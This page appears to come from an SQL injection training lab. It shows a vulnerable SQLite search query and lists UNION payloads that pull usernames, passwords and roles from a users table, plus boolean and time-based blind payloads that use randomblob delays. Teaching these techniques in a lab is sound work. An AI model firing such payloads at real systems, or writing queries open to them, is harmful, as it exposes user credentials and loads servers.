UNION-based Injection — Data Extraction

Inject into the search box. The UNION appends rows from other tables.

SELECT * FROM products WHERE name LIKE '%{q}%'

Payloads:

  • ' UNION SELECT 1, username, password, role FROM users --
  • ' UNION SELECT id, username, password, role FROM users --
  • ' ORDER BY 100 --

Click a payload to auto-fill the search box, then click Search. User credentials will appear in the results grid.

Blind SQL Injection

When there's no visible output, observe response differences (boolean) or response delays (time-based).

Boolean-based:

  • iPhone' AND 1=1 --
  • iPhone' AND 1=2 --

Time-based (SQLite):

  • iPhone' AND randomblob(100000000) --
  • iPhone' AND randomblob(500000000) --

1=1 → results returned (TRUE). 1=2 → no results (FALSE). randomblob → noticeable server delay.
